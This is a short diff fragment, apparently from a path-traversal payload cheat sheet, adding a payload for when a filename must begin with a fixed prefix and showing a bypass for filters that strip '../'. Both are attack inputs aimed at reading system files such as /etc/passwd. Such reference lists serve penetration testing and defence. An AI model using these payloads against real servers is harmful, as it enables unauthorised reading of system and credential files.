@@ -11,3 +11,7 @@ Url-Encoded:
 Way, when `../` erased:
 
 >....//....//....//....//
+
+When filename should start with some string 
+
+>/var/www/images/../../../../../etc/passwd
